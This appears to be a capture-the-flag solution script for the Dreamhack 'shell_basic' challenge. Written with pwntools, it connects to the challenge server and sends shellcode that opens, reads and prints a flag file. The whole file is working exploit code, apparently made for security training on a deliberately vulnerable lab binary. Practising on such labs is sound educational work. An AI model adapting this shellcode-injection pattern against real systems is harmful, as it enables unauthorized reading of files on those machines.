from pwn import *

context(arch="amd64", log_level = 'DEBUG')
#context.arch = "amd64"

#p = process('./shell_basic')
p = remote('host3.dreamhack.games', 11574)
e = ELF('./shell_basic')

r = "/home/shell_basic/flag_name_is_loooooong"

shellcode = ''
shellcode += shellcraft.open(r)
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

p.recvuntil("shellcode: ")
p.sendline(asm(shellcode))
print(p.recv())
